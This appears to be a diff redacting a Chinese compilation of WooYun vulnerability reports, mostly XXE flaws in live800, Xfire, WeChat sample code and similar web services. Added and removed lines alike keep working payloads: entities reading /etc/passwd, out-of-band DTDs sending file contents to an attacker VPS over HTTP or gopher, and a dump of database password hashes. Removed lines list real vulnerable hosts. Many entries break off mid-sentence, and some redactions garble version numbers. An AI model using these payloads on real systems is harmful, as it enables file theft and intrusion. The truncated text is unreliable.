@@ -12,9 +12,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 二哥的典型例子：http://wooyun.org/bugs/wooyun-2010-058381这边也有：http://wooyun.org/bugs/wooyun-2014-073439介绍可以看这里：http://wooyun.org/bugs/wooyun-2010-058381出问题的点在校招平台上传docx文件，docx是典型的xml文件（压缩过的）对实体做解析就会允许远程访问网站，本地文件访问，DOS攻击在这个场景下利用比较有限吧，因为返回的数据有限。对docx解析后，只提取其中 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。
+**详情**: 二哥的典型例子：https://example.com/[已脱敏] 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。
 
-**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@qq.com</w:t>将这份docx提交，最终被解析成对用数据
+**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@某互联网公司.com</w:t>将这份docx提交，最终被解析成对用数据
 
 **绕过**: 直接利用
 
@@ -34,7 +34,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先得到自己手机签到和抽奖时候的链接，下次可以直接用浏览器访问链接签到、抽奖。抽奖时候的连接类似这样的（XXX是替代字符）：http://ah2.zhangyue.com/zybook/u/p/user.php?action=qiandao&Act=turn_card&key=2QM&usr=156XXX01&rgt=5&p1=1307271227XXXX74&p2=108X5&p3=63X0&p4=501603&p5=12&p6=IJIGXXXFIHD&p7=DFIFHEXXXEEC&p9=1&p15=XT615&p16=XT615&p19=ireader_2.3.1&pk=抽奖过程是由js控制的，结果已经设定好了是6，就是会抽到6个阅饼，是由count这个变量定义的。只要用浏览器打开，修改这个变量即可：这个变量应该是在上一步的时候生成的连接定义的，从连接中的变量传递过来，所以可以直接访
+**详情**: 首先得到自己手机签到和抽奖时候的链接，下次可以直接用浏览器访问链接签到、抽奖。抽奖时候的连接类似这样的（XXX是替代字符）：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -45,7 +45,7 @@
 
 ---
 ### [wooyun-2014-077146] 天翼云一处xxe漏洞可读取任意文件
-**厂商**: 189邮箱业务支撑中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载
+**厂商**: 某邮箱服务业务支撑中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 上传功能
 
@@ -56,7 +56,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 解压缩docx文件，修改word/document.xml189邮箱的文件预览页存在该问题。<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><w:document xmlns:ve="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openx
+**详情**: 解压缩docx文件，修改word/document.xml某邮箱服务的文件预览页存在该问题。<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><w:document xmlns:ve="https://example.com/[已脱敏]" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="https://example.com/[已脱敏]" xmlns:m="https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -100,9 +100,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 可参考WooYun: 唯品会存在Blind XXE 漏洞http://live800.wan.renren.com/live800/services/IVerification?wsdl
+**详情**: 可参考WooYun: 唯品会存在Blind XXE 漏洞https://example.com/[已脱敏]
 
-**POC**: http://live800.wan.renren.com/live800/services/IVerification?wsdl可以和WooYun: 人人网某分站存在任意文件下载漏洞对应上
+**POC**: https://example.com/[已脱敏] 人人网某分站存在任意文件下载漏洞对应上
 
 **绕过**: 直接利用
 
@@ -110,8 +110,8 @@
 ---
 
 ---
-### [wooyun-2016-0205725] 中国电信某省系统Blink XXE
-**厂商**: 中国电信 | **年份**: 2016 | **类型**: 任意文件遍历/下载
+### [wooyun-2016-0205725] 某运营商某省系统Blink XXE
+**厂商**: 某运营商 | **年份**: 2016 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 功能测试
 
@@ -188,9 +188,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 具体的漏洞原理可以参考http://hivesec.net/web-security/%E5%85%B3%E4%BA%8Eblind-xxe.html漏洞在：http://onlineservice.xiamenair.com/live800/services/IVerification?wsdl
+**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]
 
-**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xx.xx.xx.xx/is/1.xml">%remote;]>如图：收到返回包：
+**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回包：
 
 **绕过**: 直接利用
 
@@ -210,9 +210,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。具体的漏洞原理可以参考http://hivesec.net/web-security/%E5%85%B3%E4%BA%8Eblind-xxe.html和WooYun: Xfire文件读取漏洞只能说这是被小瞧的问题，仅作预警和漏洞验证（赶紧内部检查一下所有使用xfire组件的网站吧！！！）
+**详情**: 关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。具体的漏洞原理可以参考https://example.com/[已脱敏] Xfire文件读取漏洞只能说这是被小瞧的问题，仅作预警和漏洞验证（赶紧内部检查一下所有使用xfire组件的网站吧！！！）
 
-**POC**: xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生问题网站：http://800.vip.com/live800/services/IVerification?wsdl自己定义XML文件如下：<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:port/%a;'>"> %b; %c;将xml文件保存在vps中 为http://ip:port/1.xml然后构造如下：<?xml version="1.0" encoding
+**POC**: xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生问题网站：https://example.com/[已脱敏] % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:port/%a;'>"> %b; %c;将xml文件保存在vps中 为http://ip:port/1.xml然后构造如下：<?xml version="1.0" encoding
 
 **绕过**: 直接利用
 
@@ -276,7 +276,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zxkf.efunds.com.cn/live800/services/IVerification?wsdl
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -286,7 +286,7 @@
 ---
 
 ---
-### [wooyun-2015-0135615] wemall微信开源PHP商城系统一处blind xxe（无需登录，附POC）
+### [wooyun-2015-0135615] wemall某互联网公司开源PHP商城系统一处blind xxe（无需登录，附POC）
 **厂商**: www.inuoer.com | **年份**: 2015 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 功能测试
@@ -298,18 +298,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试版本wemall 3.3下载地址 http://git.oschina.net/einsqing/wemall/repository/archive?ref=master 需要开源中国的账号//Application\Lib\Action\Admin\WechatAction.class.php<?phpclass WechatAction extends Action {public function init() {import ( 'wechat', APP_PATH . 'Common', '.class.php' );$config = M ( "Wxconfig" )->where ( array ("id" => "1") )->find ();$options = array ('token' => $config ["token"], // 填写你设定的key'enc
+**详情**: 测试版本wemall 3.3下载地址 https://example.com/[已脱敏] 需要开源中国的账号//Application\Lib\Action\Admin\WechatAction.class.php<?phpclass WechatAction extends Action {public function init() {import ( 'wechat', APP_PATH . 'Common', '.class.php' );$config = M ( "Wxconfig" )->where ( array ("id" => "1") )->find ();$options = array ('token' => $config ["token"], // 填写你设定的key'enc
 
-**POC**: 下面是存在xxe的http://www.dadodo.wang/index.php?g=Admin&m=Wechat&a=indexhttp://www.jxbar.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.liushengjie.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.wifi-xj.com/index.php?g=Admin&m=Wechat&a=indexhttp://www.tjguguai.net/index.php?g=Admin&m=Wechat&a=indexhtt
+**POC**: 下面是存在xxe的https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: http://wiki.wooyun.org/web:xxe-attack
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2014-065613] 微信某示例代码函数使用不当可能会导致第三方厂商躺枪
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 默认配置不当
+### [wooyun-2014-065613] 某互联网公司某示例代码函数使用不当可能会导致第三方厂商躺枪
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -320,9 +320,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 从官方下了最新的微信开放平台接入示例文件（php）http://mp.weixin.qq.com/mpres/htmledition/res/wx_sample.zipwx_sample.php行27$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];//extract post dataif (!empty($postStr)){$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);$fromUsername = $postObj->FromUserName;$toUsername = $postObj->ToUserName;$keyword = trim($postObj->Content)使用了simplexml_load_string函数来解析p
+**详情**: 从官方下了最新的某互联网公司开放平台接入示例文件（php）https://example.com/[已脱敏] = $GLOBALS["HTTP_RAW_POST_DATA"];//extract post dataif (!empty($postStr)){$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);$fromUsername = $postObj->FromUserName;$toUsername = $postObj->ToUserName;$keyword = trim($postObj->Content)使用了simplexml_load_string函数来解析p
 
-**POC**: WooYun: PHPYUN最新版任意文件读取漏洞WooYun: PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）这两个phpyun的虽然没公开 但根据厂家回复基本能确定就是微信api出的问题另外最新版discuzx3.2也是 默认安装就带有微信插件，但是未启用。换而言之 未初始化TOKEN。/source/plugin/wechat/wechat.lib.class.php行153$postdata = file_get_contents("php://input");if ($postdata) {if (!$this->_checkSignature()) {ret
+**POC**: WooYun: PHPYUN最新版任意文件读取漏洞WooYun: PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）这两个phpyun的虽然没公开 但根据厂家回复基本能确定就是某互联网公司api出的问题另外最新版discuzx3.2也是 默认安装就带有某互联网公司插件，但是未启用。换而言之 未初始化TOKEN。/source/plugin/wechat/wechat.lib.class.php行153$postdata = file_get_contents("php://input");if ($postdata) {if (!$this->_checkSignature()) {ret
 
 **绕过**: 过滤绕过
 
@@ -342,9 +342,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 具体的漏洞原理可以参考http://hivesec.net/web-security/%E5%85%B3%E4%BA%8Eblind-xxe.html漏洞在：http://care.amwaynet.com.cn/live800/services/IVerification?wsdl
+**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]
 
-**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xx.xx.xx.xx/is/1.xml">%remote;]>如图：收到返回：[11/Jan
+**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回：[11/Jan
 
 **绕过**: 直接利用
 
@@ -364,9 +364,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 反编译你们中天系统的时候发现了这个URL http://122.225.117.68/zhongtian.zto,发现可以Post xml数据,试试看.提交数据:服务器监听数据:122.225.117.68 - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"122.225.117.68 - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 HTTP/1.1" 403 4958 "-" 
+**详情**: 反编译你们中天系统的时候发现了这个URL http://[IP已脱敏] xml数据,试试看.提交数据:服务器监听数据:[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 HTTP/1.1" 403 4958 "-" 
 
-**POC**: 反编译你们中天系统的时候发现了这个URL http://122.225.117.68/zhongtian.zto,发现可以Post xml数据,试试看.提交数据:服务器监听数据:122.225.117.68 - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"122.225.117.68 - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions
+**POC**: 反编译你们中天系统的时候发现了这个URL http://[IP已脱敏] xml数据,试试看.提交数据:服务器监听数据:[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions
 
 **绕过**: 直接利用
 
@@ -386,9 +386,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 类似的可以参考 http://wooyun.org/bugs/wooyun-2014-074069具体的漏洞原理可以参考http://hivesec.net/web-security/%E5%85%B3%E4%BA%8Eblind-xxe.html
+**详情**: 类似的可以参考 https://example.com/[已脱敏]
 
-**POC**: 漏洞在：http://cazx.changan.com.cn/live800/services/IVerification?wsdl自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % rem
+**POC**: 漏洞在：https://example.com/[已脱敏] % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % rem
 
 **绕过**: 直接利用
 
@@ -408,13 +408,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://www.pull-in.asia/cn/index.php/pullin_china_cn/api/xmlrpcURL：http://www.pull-in.asia/index.php/pullin_hk_en/api/xmlrpcPOST数据:<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>
+**详情**: URL：https://example.com/[已脱敏] version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 1.检查所使用的底层xml解析库，默认禁止外部实体的解析；2.更新补丁：存在漏洞的版本: 1.11.111.12.0 RC12.0.0 beta4等更早版本漏洞修补后的版本: 1.11.121.12.0 RC22.0.0 beta5修补方案：根据相对应的版本进行升级升级地址链接: http://fr
+**修复**: 1.检查所使用的底层xml解析库，默认禁止外部实体的解析；2.更新补丁：存在漏洞的版本: [IP已脱敏].0 RC12.0.0 beta4等更早版本漏洞修补后的版本: [IP已脱敏].0 RC22.0.0 beta5修补方案：根据相对应的版本进行升级升级地址链接: http://fr
 ---
 
 ---
@@ -430,7 +430,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://my.yonyou.com/xmlrpc存在xxe漏洞
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -452,9 +452,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.sogou.com/music/musicDownload.jsp?album=%E5%8F%A3%E9%9F%B3&clk=2&keyword=1&lyc=&lyricMatch=yes&p=1&qqdurl=http://cc.stream.qqmusic.qq.com/C100002T2WQy2NIgLS.m4a%3Ffromtag%3D52&s=%E7%AA%A6%E5%94%AF&singer=%E7%AA%A6%E5%94%AF&size=0&title=1&type=%E6%9C%AA%E7%9F%A5&uID=qE_VFO3qxwVsK7Gx&url=http://xxx.com/1&v=2&w=1111其中参数url存在XXE风险，这里没有回显，先通过HTTP Accesslog验证一下。1的文件内容如下：<?xml version="1.0" enco
+**详情**: https://example.com/[已脱敏] Accesslog验证一下。1的文件内容如下：<?xml version="1.0" enco
 
-**POC**: http://m.sogou.com/music/musicDownload.jsp?album=%E5%8F%A3%E9%9F%B3&clk=2&keyword=1&lyc=&lyricMatch=yes&p=1&qqdurl=http://cc.stream.qqmusic.qq.com/C100002T2WQy2NIgLS.m4a%3Ffromtag%3D52&s=%E7%AA%A6%E5%94%AF&singer=%E7%AA%A6%E5%94%AF&size=0&title=1&type=%E6%9C%AA%E7%9F%A5&uID=qE_VFO3qxwVsK7Gx&url=http
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -496,7 +496,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参看陈老师的“Xfire文件读取漏洞”WooYun: Xfire文件读取漏洞系统连接：汉启的邮件系统http://221.228.212.171:8081/smartedm/welcome.do对应linkhttp://221.228.212.171:8081/smartedm/services采用AWVS验证：读文件：列目录：
+**详情**: 参看陈老师的“Xfire文件读取漏洞”WooYun: Xfire文件读取漏洞系统连接：汉启的邮件系统http://[IP已脱敏]
 
 **POC**: evil.dtd内容：<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xml文件内容：<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;
 
@@ -518,9 +518,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 谷歌或者百度搜索：技术支持：常州市网赢科技有限公司技术支持：网赢科技厂商主页：http://www.net137.cn/涉及大量案例如：http://www.jsytchem.com/yanjiu/sub_news.asp?id=153http://www.jiehechina.com/newshow1.asp?id=66http://www.daban-japan.cn/newshow1.asp?id=40http://www.lhzyhj.com/newshow1.asp?id=113http://www.sdydgc.cn/temp.asp?id=31http://www.sapphireed.com/cooshow.asp?id=438http://www.yxgedeng.com/pro_show.asp?id=131http://tjhonglin.com/pro_show.a
+**详情**: 谷歌或者某搜索引擎搜索：技术支持：常州市网赢科技有限公司技术支持：网赢科技厂商主页：https://example.com/[已脱敏]
 
-**POC**: http://www.jsytchem.com/yanjiu/sub_news.asp?id=153http://www.jiehechina.com/newshow1.asp?id=66http://www.daban-japan.cn/newshow1.asp?id=40http://www.lhzyhj.com/newshow1.asp?id=113http://www.hrnd.cn/sub_news1.asp?id=134
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -540,9 +540,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 具体的漏洞原理可以参考http://hivesec.net/web-security/%E5%85%B3%E4%BA%8Eblind-xxe.html漏洞在：http://chat.kefu.xoyo.com/live800/services/IVerification?wsdl
+**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]
 
-**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://(自己的域名)/?xxe_l=%info1;'>">%int;%trick;将代码放入到自己的VPS上面。加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xx.xx.xx.xx/is/1.xml">%remote;]>如图：收到返回：[11/Ja
+**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://(自己的域名)/?xxe_l=%info1;'>">%int;%trick;将代码放入到自己的VPS上面。加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回：[11/Ja
 
 **绕过**: 直接利用
 
@@ -568,7 +568,7 @@
 
 **绕过**: 直接利用
 
-**修复**: POST /AOIS/YSTA.asmx HTTP/1.1SOAPAction: "http://tempuri.org/LoginEx"Content-Type: text/xml; charset="utf-8"User-Agent: CodeGear SOAP 1.3Host: www.bja
+**修复**: POST /AOIS/YSTA.asmx HTTP/1.1SOAPAction: "https://example.com/[已脱敏]"Content-Type: text/xml; charset="utf-8"User-Agent: CodeGear SOAP 1.3Host: www.bja
 ---
 
 ---
@@ -606,7 +606,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参看连接： Xfire文件读取漏洞WooYun: Xfire文件读取漏洞存在问题的连接：http://mailer.lvmama.com:8081/smartedm/services任取一个服务http://mailer.lvmama.com:8081/smartedm/services/EDMService?wsdlawvs验证：读文件列目录：
+**详情**: 参看连接： Xfire文件读取漏洞WooYun: Xfire文件读取漏洞存在问题的连接：https://example.com/[已脱敏]
 
 **POC**: evil.dtd内容：<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xml文件内容：<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;
 
@@ -628,7 +628,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1）测试注入点如下，存在注入的参数为columnid；http://api.cbox.cntv.cn/api/column_detail?pid=ukztYUybsWanMQcNKADef2gE9piG4h6d&version=1.0.4&columnid=C103362）数据库相关信息；DB Server: MySQL >=5Current User: 	api@cms24Sql Version: 	5.1.61-logCurrent DB: 	mvsSystem User: 	api@10.7.3.223Host Name: 	cboxup9DB User & Pass: 	root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:localhostapi:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:10.7.
+**详情**: 1）测试注入点如下，存在注入的参数为columnid；https://example.com/[已脱敏] Server: MySQL >=5Current User: 	api@cms24Sql Version: 	5.1.61-logCurrent DB: 	mvsSystem User: 	api@[IP已脱敏]Host Name: 	cboxup9DB User & Pass: 	root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:localhostapi:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:10.7.
 
 **POC**: 见详细说明
 
@@ -650,7 +650,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://113.98.241.231:7979/mineinfohttp://183.238.123.235:7979/mineinfozszx=招商中心？招商资讯？zszq=招商证券可以浏览目录应该不止这两个IP存在问题，其他的自己去排查吧
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -672,9 +672,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 二哥的典型例子：http://wooyun.org/bugs/wooyun-2010-058381这边也有：http://wooyun.org/bugs/wooyun-2014-073439介绍可以看这里：http://wooyun.org/bugs/wooyun-2010-058381出问题的点在校招平台上传docx文件，docx是典型的xml文件（压缩过的）对实体做解析就会允许远程访问网站，本地文件访问，DOS攻击在这个场景下利用比较有限吧，因为返回的数据有限。对docx解析后，只提取其中 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。
+**详情**: 二哥的典型例子：https://example.com/[已脱敏] 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。
 
-**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@qq.com</w:t>将这份docx提交，最终被解析成对用数据
+**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@某互联网公司.com</w:t>将这份docx提交，最终被解析成对用数据
 
 **绕过**: 直接利用
 
